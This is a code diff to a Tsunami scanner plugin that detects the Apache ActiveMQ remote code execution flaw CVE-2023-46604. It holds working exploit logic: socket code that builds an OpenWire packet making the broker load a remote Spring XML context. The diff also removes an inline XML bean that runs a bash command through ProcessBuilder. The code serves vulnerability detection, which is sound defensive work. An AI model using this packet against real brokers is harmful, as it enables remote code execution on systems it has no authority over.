@@ -1,5 +1,5 @@
 /*
- * Copyright 2021 Google LLC
+ * Copyright 2024 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -19,7 +19,9 @@ import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
 
 import com.google.common.net.HostAndPort;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.tsunami.common.data.NetworkEndpointUtils;
+import com.google.tsunami.plugin.annotations.ForServiceName;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.*;
@@ -36,11 +38,13 @@ import com.google.tsunami.plugin.annotations.PluginInfo;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.IOException;
 import java.io.OutputStream;
 import java.lang.annotation.Retention;
 import java.lang.annotation.RetentionPolicy;
 import java.net.Socket;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 import java.util.Map;
 import javax.inject.Inject;
@@ -55,37 +59,22 @@ import javax.net.SocketFactory;
     description = Cve202346604Detector.VULN_DESCRIPTION,
     author = "hh-hunter",
     bootstrapModule = Cve202346604DetectorBootstrapModule.class)
+@ForServiceName({"apachemq"})
 public final class Cve202346604Detector implements VulnDetector {
 
   @VisibleForTesting
   static final String VULN_DESCRIPTION =
-      "Apache ActiveMQ is vulnerable to Remote Code Execution.The vulnerability may allow a remote attacker with "
+      "Apache ActiveMQ is vulnerable to Remote Code Execution. The vulnerability may allow a remote attacker with "
           + "network access to a broker to run arbitrary shell commands by manipulating serialized class types in "
           + "the OpenWire protocol to cause the broker to instantiate any class on the classpath. ";
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
-  private static final String[] SECURE_VERSION = {"5.15.16", "5.16.7", "5.17.6", "5.18.3"};
-  private static final String PAYLOAD_XML =
-      "<beans xmlns=\"http://www.springframework.org/schema/beans\" "
-          + "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
-          + "xsi:schemaLocation=\"http://www.springframework.org/schema/beans "
-          + "http://www.springframework.org/schema/beans/spring-beans.xsd\">\n"
-          + "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n"
-          + "    <constructor-arg>\n"
-          + "      <list>\n"
-          + "        <value>bash</value>\n"
-          + "        <value>-c</value>\n"
-          + "        <value><![CDATA[ping -c 5 REPLACE_FLAG]]></value>\n"
-          + "      </list>\n"
-          + "    </constructor-arg>\n"
-          + "  </bean>\n"
-          + "</beans>";
+  private static final ImmutableList<String> SECURE_VERSIONS =
+      ImmutableList.of("5.15.16", "5.16.7", "5.17.6", "5.18.3");
 
   private final Clock utcClock;
-
   private final SocketFactory socketFactory;
-
   private final PayloadGenerator payloadGenerator;
 
   @Inject
@@ -119,6 +108,15 @@ public final class Cve202346604Detector implements VulnDetector {
 
   private boolean isServiceVulnerable(NetworkService networkService) {
     HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
+    String currentVersion = getServerVersion(hp.getHost(), hp.getPort());
+    if (checkVersionIsSecure(currentVersion)) {
+      logger.atInfo().log(
+          "The target version %s is not susceptible. A version comparison has been completed, but payload "
+              + "verification has not been officially initiated.",
+          currentVersion);
+      return false;
+    }
+
     PayloadGeneratorConfig config =
         PayloadGeneratorConfig.newBuilder()
             .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
@@ -132,29 +130,13 @@ public final class Cve202346604Detector implements VulnDetector {
       return false;
     }
     try {
-      String currentVersion = getServerVersion(hp.getHost(), hp.getPort());
-      if (checkVersionIsSecure(currentVersion)) {
-        logger.atInfo().log(
-            "Target Version %s %s is not vulnerable", currentVersion, networkService);
+      boolean sendPayloadResult = this.sendPayloadToTarget(hp.getHost(), hp.getPort(), payload);
+      if (!sendPayloadResult) {
+        logger.atInfo().log("Send payload to target %s failed", networkService);
         return false;
       }
-      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
-      OutputStream os = socket.getOutputStream();
-      DataOutputStream dos = new DataOutputStream(os);
-      dos.writeInt(0);
-      dos.writeByte(31);
-      dos.writeInt(0);
-      dos.writeBoolean(false);
-      dos.writeInt(0);
-      dos.writeBoolean(true);
-      dos.writeBoolean(true);
-      dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
-      dos.writeBoolean(true);
-      dos.writeUTF(String.format("http://%s/tsunami_scanner.xml", payload.getPayload()));
 
-      dos.close();
-      os.close();
-      socket.close();
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
 
       if (payload.checkIfExecuted()) {
         logger.atInfo().log("Target %s is vulnerable", networkService);
@@ -169,9 +151,42 @@ public final class Cve202346604Detector implements VulnDetector {
     return false;
   }
 
+  // Generate payload for Apache ActiveMQ RCE(CVE-2023-46604), and use socket to send payload
+  private boolean sendPayloadToTarget(String host, int port, Payload payload) {
+    try {
+      Socket socket = socketFactory.createSocket(host, port);
+      OutputStream os = socket.getOutputStream();
+      DataOutputStream dos = new DataOutputStream(os);
+      // Size
+      dos.writeInt(0);
+      // Type
+      dos.writeByte(31);
+      // CommandId
+      dos.writeInt(0);
+      // Command response required
+      dos.writeBoolean(false);
+      // CorrelationId
+      dos.writeInt(0);
+      // body
+      dos.writeBoolean(true);
+      // UTF
+      dos.writeBoolean(true);
+      dos.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
+      dos.writeBoolean(true);
+      dos.writeUTF(String.format("http://%s", payload.getPayload()));
+
+      dos.close();
+      os.close();
+      socket.close();
+      return true;
+    } catch (IOException e) {
+      return false;
+    }
+  }
+
   public static boolean checkVersionIsSecure(String currentVersion) {
     String[] parts1 = currentVersion.split("\\.");
-    for (String secureVersion : SECURE_VERSION) {
+    for (String secureVersion : SECURE_VERSIONS) {
       String[] parts2 = secureVersion.split("\\.");
       if (parts1[0].equals(parts2[0])) {
         if (parts1[1].equals(parts2[1])) {
